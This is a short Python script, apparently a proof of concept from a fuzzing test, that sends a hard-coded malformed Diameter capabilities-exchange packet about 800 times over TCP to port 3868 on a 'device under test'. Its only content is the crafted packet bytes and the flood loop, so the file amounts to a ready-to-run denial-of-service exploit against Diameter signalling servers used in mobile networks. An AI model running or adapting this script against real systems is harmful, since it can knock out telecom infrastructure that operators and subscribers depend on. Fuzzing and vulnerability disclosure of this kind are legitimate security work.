#!/usr/bin/python
import socket

# This is the bytecode for the malformed Diameter packet. Original test was giant... this one is small
fuzz=["\x01\x42\x00\x00\x80\x00\x01\x01\x00\x00\x00\x00\x2c\x4e\x70\xe4\x00\x00\x00\x2b\x00\x00\x01\x08\x40\x00\x00\x14\x31\x37\x32\x2e\x31\x39\x2e\x31\x37\x30\x2e\x32\x00\x00\x01\x28\x40\x00\x00\x0f\x61\x63\x6d\x65\x2e\x65\x73\x00\x00\x00\x01\x01\x40\x00\x00\x0e\x00\x01\xac\x13\xaa\x02\x00\x00\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x32\xdb\x00\x00\x01\x0d\x00\x00\x00\x22\x44\x69\x61\x6d\x65\x74\x65\x72\x20\x53\x65\x72\x76\x65\x72\x20\x54\x65\x73\x74\x20\x53\x75\x69\x74\x65\x00\x00\x00\x00\x01\x16\x40\x00\x00\x0c\x00\x01\x86\xa0\x00\x00\x01\x09\x40\x00\x00\x0c\x00\x00\x32\xdb\x00\x00\x01\x09\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x23\x00\x00\x01\x03\x40\x00\x00\x0c\x00\x00\x00\x03\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x00\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x23\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x38\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x01\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x31\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x05\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x14\x00\x00\x01\x04\x40\x00\x00\x20\x00\x00\x01\x0a\x40\x00\x00\x0c\x00\x00\x28\xaf\x00\x00\x01\x02\x40\x00\x00\x0c\x01\x00\x00\x16"]

#Change the IP in the s.connect to your device under test's Diameter interface
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('172.19.170.10', 3868))

counter=0
while counter <= 800:
   for buffstring in fuzz:
	counter = counter + 1
	s.send(buffstring)
